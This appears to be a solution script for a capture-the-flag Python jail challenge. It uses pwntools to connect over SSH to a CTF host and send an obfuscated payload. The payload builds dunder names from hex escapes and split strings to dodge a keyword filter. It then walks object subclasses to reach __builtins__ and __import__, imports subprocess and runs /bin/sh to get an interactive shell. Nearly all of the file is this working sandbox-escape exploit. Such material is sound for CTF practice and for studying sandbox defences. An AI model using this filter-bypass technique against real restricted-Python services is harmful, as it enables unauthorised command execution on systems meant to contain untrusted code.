from pwn import *

p=process(['ssh','-tt','-i','../x.pem','-p','2222','user@hell-of-a-jail.ctf.insecurity-insa.fr'])

code='''
d='\x2e'
u='\x5f'
g=getattr

c=2*u+'class'
c+=2*u
b=2*u+'base'
b+=2*u
s=2*u+'subcl'
s+='asses'
s+=2*u
i=2*u+'init'
i+=2*u
l=2*u+'glob'
l+='als'+2*u
m='modu'
m+='les'
gl='globals'
ic=2*u+'imp'
ic+='ort'
ic+=2*u
bu=2*u+'bui'
bu+='ltins'
bu+=2*u

_=g({},c)
_=g(_,b)
_=g(_,s)
_=_()

_=_[104]
_=g(_,i)
_=g(_,l)
p=_[bu]
_=p[ic]
s='subpro'
s+='cess'
s=_(s)
c=g(s,'call')

x=['/bin/sh']
y=['-s']
x=x+y
c(x)
'''

p.sendlineafter('>',code)
p.interactive()
